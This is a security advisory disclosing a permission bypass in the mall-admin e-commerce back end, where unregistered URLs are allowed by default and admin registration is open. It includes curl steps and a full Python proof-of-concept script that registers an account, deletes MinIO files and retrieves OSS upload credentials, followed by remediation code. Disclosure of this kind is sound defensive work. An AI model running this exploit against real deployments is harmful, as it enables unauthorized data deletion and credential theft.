# Security Advisory: Permission Bypass in mall-admin

## Advisory Information

| Field | Value |
|-------|-------|
| **Project** | mall |
| **Module** | mall-admin |
| **Vendor** | macrozheng |
| **GitHub** | https://github.com/macrozheng/mall |
| **Vulnerability Type** | Permission Bypass / Broken Access Control |
| **Severity** | High |
| **CVSS 3.1** | 7.2 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| **Affected Versions** | <= 1.0-SNAPSHOT (current) |
| **Discovered** | 2026-04-15 |

## Summary

The `DynamicAccessDecisionManager` component in mall-admin contains a logic flaw that causes it to **allow access by default** when a requested URL is not registered in the `ums_resource` database table. This violates the principle of "deny by default" and allows any authenticated user to access sensitive endpoints that were not explicitly protected.

Combined with the fact that `/admin/register` is whitelisted (no authentication required), an attacker can:
1. Register a new admin account (no role assigned by default)
2. Login to obtain a valid JWT token
3. Access unprotected sensitive endpoints such as `/minio/delete` and `/aliyun/oss/policy`

## Vulnerability Details

### Root Cause

**File**: `mall-security/src/main/java/com/macro/mall/security/component/DynamicAccessDecisionManager.java`

```java
@Override
public void decide(Authentication authentication, Object object,
                   Collection<ConfigAttribute> configAttributes)
        throws AccessDeniedException, InsufficientAuthenticationException {
    // When the interface is not configured with resources, allow access directly
    if (CollUtil.isEmpty(configAttributes)) {
        return;  // <-- VULNERABILITY: Should deny access, not allow
    }
    // ... permission checking logic
}
```

When `configAttributes` is empty (i.e., the URL is not in `ums_resource` table), the method returns immediately without any permission check, effectively granting access.

### Affected Endpoints

The following endpoints are NOT registered in `ums_resource` table and are therefore accessible to any authenticated user:

| Endpoint | Method | Function | Impact |
|----------|--------|----------|--------|
| `/minio/upload` | POST | Upload file to MinIO | Already in whitelist (no auth) |
| `/minio/delete` | POST | Delete file from MinIO | Any auth user can delete files |
| `/aliyun/oss/policy` | GET | Get OSS upload signature | Credential leak |

### Secondary Issue: Open Registration

**File**: `mall-admin/src/main/resources/application.yml`

```yaml
secure:
  ignored:
    urls:
      - /admin/register  # Anyone can register as admin
      - /admin/login
      - /minio/upload
```

The `/admin/register` endpoint is whitelisted, allowing unauthenticated users to create admin accounts.

## Proof of Concept

### Environment

```
Target: http://localhost:8090
Database: MySQL (mall-mysql container)
Storage: MinIO (mall-minio container)
```

### Step 1: Register a New Admin Account (No Authentication Required)

```bash
curl -X POST http://localhost:8090/admin/register \
  -H "Content-Type: application/json" \
  -d '{"username":"poc_user","password":"poc123"}'
```

**Response:**
```json
{
  "code": 200,
  "message": "操作成功",
  "data": {
    "id": 14,
    "username": "poc_user",
    "status": 1
  }
}
```

### Step 2: Verify New Account Has No Role

```bash
docker exec mall-mysql mysql -u root -proot mall -e \
  "SELECT a.username, r.name as role FROM ums_admin a
   LEFT JOIN ums_admin_role_relation arr ON a.id = arr.admin_id
   LEFT JOIN ums_role r ON arr.role_id = r.id
   WHERE a.username = 'poc_user';"
```

**Output:**
```
username    role
poc_user    NULL
```

The account has **no role assigned**, meaning it should have **no permissions**.

### Step 3: Login to Obtain JWT Token

```bash
curl -X POST http://localhost:8090/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"poc_user","password":"poc123"}'
```

**Response:**
```json
{
  "code": 200,
  "data": {
    "tokenHead": "Bearer ",
    "token": "eyJhbGciOiJIUzUxMiJ9..."
  }
}
```

### Step 4: Access Protected Endpoints (Should Be Denied - Returns 403)

```bash
TOKEN="eyJhbGciOiJIUzUxMiJ9..."

# Test: Access order management (protected by ums_resource)
curl http://localhost:8090/order/list -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{"code": 403, "message": "没有相关权限", "data": "抱歉，您没有访问权限"}
```

This is correct behavior - the endpoint is protected and the user has no role.

### Step 5: Access Unprotected Endpoints (Vulnerability - Returns 200)

```bash
# Exploit: Delete arbitrary file from MinIO
curl -X POST "http://localhost:8090/minio/delete?objectName=any_file" \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{"code": 200, "message": "操作成功", "data": null}
```

The request succeeded even though the user has no role. This demonstrates the vulnerability.

```bash
# Exploit: Get Aliyun OSS upload credentials
curl http://localhost:8090/aliyun/oss/policy \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{
  "code": 200,
  "data": {
    "accessKeyId": "test",
    "policy": "...",
    "signature": "...",
    "host": "http://macro-oss.oss-cn-shenzhen.aliyuncs.com"
  }
}
```

OSS credentials are leaked to unauthorized user.

### Comparison Table

| Endpoint | In ums_resource? | Expected | Actual |
|----------|------------------|----------|--------|
| `/order/list` | Yes | 403 Denied | 403 Denied ✅ |
| `/product/list` | Yes | 403 Denied | 403 Denied ✅ |
| `/minio/delete` | No | 403 Denied | **200 OK** ❌ |
| `/aliyun/oss/policy` | No | 403 Denied | **200 OK** ❌ |

## Complete PoC Script

```python
#!/usr/bin/env python3
"""
mall-admin Permission Bypass PoC
CVE: Pending
"""
import requests

BASE_URL = "http://localhost:8090"
USERNAME = "poc_tester"
PASSWORD = "poc123456"

def main():
    print("[*] mall-admin Permission Bypass PoC")
    print("=" * 50)

    # Step 1: Register (no auth required)
    print("\n[1] Registering new admin account...")
    r = requests.post(f"{BASE_URL}/admin/register", json={
        "username": USERNAME,
        "password": PASSWORD
    })
    if r.json().get("code") == 200:
        print(f"    [+] Account created: {USERNAME}")
    else:
        print(f"    [-] Registration failed (may already exist)")

    # Step 2: Login
    print("\n[2] Logging in...")
    r = requests.post(f"{BASE_URL}/admin/login", json={
        "username": USERNAME,
        "password": PASSWORD
    })
    if r.json().get("code") != 200:
        print("    [-] Login failed")
        return
    token = r.json()["data"]["token"]
    headers = {"Authorization": f"Bearer {token}"}
    print(f"    [+] Token obtained")

    # Step 3: Test protected endpoint (should fail)
    print("\n[3] Testing protected endpoint /order/list...")
    r = requests.get(f"{BASE_URL}/order/list", headers=headers)
    if r.json().get("code") == 403:
        print(f"    [+] Correctly denied (403) - user has no role")
    else:
        print(f"    [-] Unexpected: {r.json()}")

    # Step 4: Exploit - access unprotected MinIO endpoint
    print("\n[4] Exploiting: Accessing /minio/delete (not in ums_resource)...")
    r = requests.post(f"{BASE_URL}/minio/delete?objectName=test", headers=headers)
    if r.json().get("code") == 200:
        print(f"    [!] VULNERABILITY: Access granted without role!")
        print(f"    [!] Response: {r.json()}")
    else:
        print(f"    [-] Not vulnerable: {r.json()}")

    # Step 5: Exploit - get OSS credentials
    print("\n[5] Exploiting: Accessing /aliyun/oss/policy...")
    r = requests.get(f"{BASE_URL}/aliyun/oss/policy", headers=headers)
    if r.json().get("code") == 200:
        print(f"    [!] VULNERABILITY: OSS credentials leaked!")
        data = r.json()["data"]
        print(f"    [!] Host: {data.get('host')}")
    else:
        print(f"    [-] Not vulnerable: {r.json()}")

    print("\n" + "=" * 50)
    print("[*] PoC completed")

if __name__ == "__main__":
    main()
```

## Impact

1. **Unauthorized File Deletion**: Any authenticated user can delete files from MinIO storage, potentially causing data loss or denial of service.

2. **Credential Leak**: OSS upload credentials (accessKeyId, signature, policy) can be obtained by unauthorized users, allowing arbitrary file uploads to the configured Aliyun OSS bucket.

3. **Privilege Escalation**: Users with limited roles (e.g., "Product Admin") can access endpoints outside their intended scope.

## Remediation

### Option 1: Deny by Default (Recommended)

Modify `DynamicAccessDecisionManager.java`:

```java
@Override
public void decide(Authentication authentication, Object object,
                   Collection<ConfigAttribute> configAttributes)
        throws AccessDeniedException, InsufficientAuthenticationException {
    // DENY by default for unregistered resources
    if (CollUtil.isEmpty(configAttributes)) {
        throw new AccessDeniedException("未配置权限的资源路径，默认拒绝访问");
    }
    // ... rest of the logic
}
```

### Option 2: Register All Sensitive Endpoints

Add the missing endpoints to `ums_resource` table:

```sql
INSERT INTO ums_resource (create_time, name, url, description, category_id)
VALUES
  (NOW(), 'MinIO文件管理', '/minio/**', 'MinIO对象存储管理', 4),
  (NOW(), 'OSS文件管理', '/aliyun/oss/**', '阿里云OSS对象存储管理', 4);
```

### Option 3: Remove Open Registration

Remove `/admin/register` from the whitelist in `application.yml`.

## References

- [OWASP Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)

## Timeline

| Date | Event |
|------|-------|
| 2026-04-15 | Vulnerability discovered |
| 2026-04-15 | PoC developed and verified |
| 2026-04-15 | Security advisory published |

## Disclaimer

This advisory is provided for educational and security research purposes only. The information contained herein should be used to improve the security of systems. Unauthorized access to computer systems is illegal.

